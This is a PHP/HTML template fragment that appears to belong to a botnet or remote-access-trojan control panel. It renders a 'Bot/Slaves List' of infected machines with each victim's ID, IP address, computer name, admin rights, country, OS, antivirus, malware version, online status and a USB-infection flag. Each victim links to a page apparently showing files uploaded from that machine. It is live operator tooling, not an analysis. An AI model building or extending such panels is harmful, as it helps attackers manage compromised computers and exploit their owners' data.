          <div class="card mb-3">
            <div class="card-header">
              <i class="fas  fa-user-circle"></i>
              Bot/Slaves List</div>
            <div class="card-body">
              <div class="table-responsive display responsive nowrap">
                <table class="table table-bordered" id="dataTable" width="100%" cellspacing="0">
                  <thead>
                    <tr>
                      <th><input <?php if (empty($allClients)) {
    echo "disabled";
}?> type="checkbox" name="select-all" id="select-all"></th>
                      <th>Victim ID</th>
                      <th>IP Address</th>
                      <th>Computer Name</th>
                      <th>User Status</th>
                      <th>Country</th>
                      <th>OS</th>
                      <th>Installed Date</th>
                      <th>Antivirus</th>
                      <th>Version</th>
                      <th>Status</th>
                    </tr>
                  </thead>
                  <tbody>
                    <?php foreach ($allClients as $clientData): ?>
                      <tr class="<?php if ($clientData->is_usb == "yes"): ?>text-primary<?php endif;?>">
                        <td><input type="checkbox" id="client[]" name="client[]" value="<?php echo $clientData->vicid; ?>"></td>
                        <td><a href="viewuploads.php?vicid=<?php echo $clientData->vicid ?>"><?php echo $clientData->vicid; ?></a></td>
                        <td><?php echo $clientData->ipaddress; ?></td>
                        <td><?php echo $clientData->computername; ?></td>
                        <td><?php echo $clientData->is_admin; ?></td>
                        <td class="text-center">
                          <?php if ($countries[strtoupper($clientData->country)] == "Unknown"): ?>
                            <img alt="Unknown" src="flags/X.png">
                          <?php else: ?>
                            <img alt="<?php echo $countries[strtoupper($clientData->country)]; ?>" src="flags/<?php echo $clientData->country; ?>.png">
                          <?php endif;?>
                          <p hidden><?php echo $countries[strtoupper($clientData->country)]; ?></p>
                        </td>
                        <td><?php echo $clientData->os; ?></td>
                        <td><?php echo $clientData->insdate; ?></td>
                        <td><?php echo $clientData->antivirus; ?></td>
                        <td><span class="badge badge-primary"><?php echo $clientData->version; ?></span></td>
                        <td class="align-content-center text-center">
                          <img alt="<?php echo $clientData->status; ?>" src="imgs/<?php echo strtolower($clientData->status) ?>.png">
                          <p hidden><?php $clientData->status;?></p>
                        </td>
                      </tr>
                    <?php endforeach;?>
                  </tbody>
                </table>
              </div>
            </div>
          </div>